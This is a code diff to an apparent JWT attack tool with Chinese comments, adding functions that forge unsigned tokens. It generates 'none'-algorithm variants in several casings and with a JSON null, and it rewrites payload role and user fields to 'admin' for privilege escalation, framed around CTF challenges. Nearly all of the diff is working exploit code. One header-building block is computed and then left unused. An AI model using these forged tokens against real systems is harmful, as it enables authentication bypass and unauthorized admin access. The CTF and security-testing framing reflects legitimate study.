@@ -123,8 +123,12 @@ def analyze_jwt(token: str) -> dict:
     return analysis
 
 
-def none_attack(token: str) -> Tuple[str, dict]:
+def none_attack(token: str, new_payload: Optional[dict] = None) -> Tuple[str, dict]:
     """None 算法攻击 — 移除签名并将算法设为 none.
+
+    Args:
+        token: 原始 JWT token
+        new_payload: 可选的篡改 payload (None 则保持原 payload)
 
     返回: (新token, 解码后的payload).
     """
@@ -132,12 +136,92 @@ def none_attack(token: str) -> Tuple[str, dict]:
     if header is None:
         return "", {"error": payload}
 
+    target = new_payload if new_payload else payload
     header["alg"] = "none"
     new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
-    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-    new_token = f"{new_header}.{new_payload}."
+    new_payload_b64 = _b64url_encode(json.dumps(target, separators=(",", ":")).encode())
+    new_token = f"{new_header}.{new_payload_b64}."
 
-    return new_token, payload
+    return new_token, target
+
+
+def none_attack_variants(token: str, new_payload: Optional[dict] = None) -> List[Tuple[str, str, str]]:
+    """None 算法攻击 — 生成所有绕过变体.
+
+    许多 JWT 库对 alg 大小写/类型处理不一致, 此函数生成所有常见变体:
+        - alg: "none"   (标准)
+        - alg: "None"   (首字母大写 — Python风格)
+        - alg: "NONE"   (全大写)
+        - alg: "nOnE"   (混合大小写)
+        - alg: null      (JSON null — 关键! 很多库将 null 当作 None 处理)
+
+    Returns:
+        [(variant_name, token, decoded_payload), ...]
+    """
+    header, payload, _ = decode_jwt(token)
+    if header is None:
+        return [("error", "", {"error": payload})]
+
+    target = new_payload if new_payload else payload
+    payload_b64 = _b64url_encode(json.dumps(target, separators=(",", ":")).encode())
+
+    variants = []
+    # 各变体: (名称, alg 值)
+    alg_variants = [
+        ("none (标准)", "none"),
+        ("None (首字母大写)", "None"),
+        ("NONE (全大写)", "NONE"),
+        ("nOnE (混合大小写)", "nOnE"),
+    ]
+
+    for name, alg_val in alg_variants:
+        h = dict(header)
+        h["alg"] = alg_val
+        header_b64 = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
+        variants.append((name, f"{header_b64}.{payload_b64}.", target))
+
+    # JSON null 变体 (alg: null, 不带引号 — 特殊处理)
+    h_null = dict(header)
+    h_null.pop("alg", None)
+    # 手动构造 header JSON: {"alg":null,"typ":"JWT"}
+    header_null = _b64url_encode(
+        json.dumps(h_null, separators=(",", ":")).replace('{"', '{"alg":null,"')
+        .encode() if '"typ"' in json.dumps(h_null)
+        else json.dumps({"alg": None, **h_null}).replace(': null', ':null').encode()
+    )
+    # 简化的 null 构造
+    parts = []
+    parts.append('"alg":null')
+    for k, v in h_null.items():
+        parts.append(f'"{k}":"{v}"')
+    header_null_str = '{' + ','.join(parts) + '}'
+    header_null_b64 = _b64url_encode(header_null_str.encode())
+    variants.append(("null (JSON null)", f"{header_null_b64}.{payload_b64}.", target))
+
+    return variants
+
+
+def role_escalation_attack(token: str, role_field: str = "role", 
+                            admin_value: str = "admin") -> List[Tuple[str, str, dict]]:
+    """角色提升攻击 — 自动生成修改 role 字段的所有 None 攻击变体.
+
+    针对 CTF 常见模式: JWT payload 中 user=guest, role=guest.
+    自动将 role 改为 admin 并生成所有 None 攻击变体.
+
+    Returns:
+        [(variant_name, token, new_payload), ...]
+    """
+    header, payload, _ = decode_jwt(token)
+    if header is None:
+        return [("error", "", {"error": payload})]
+
+    new_payload = dict(payload)
+    # 修改 role 和 user 为 admin
+    if "user" in new_payload:
+        new_payload["user"] = admin_value
+    new_payload[role_field] = admin_value
+
+    return none_attack_variants(token, new_payload)
 
 
 def forge_hs256(token: str, secret: str, new_payload: Optional[dict] = None) -> str:
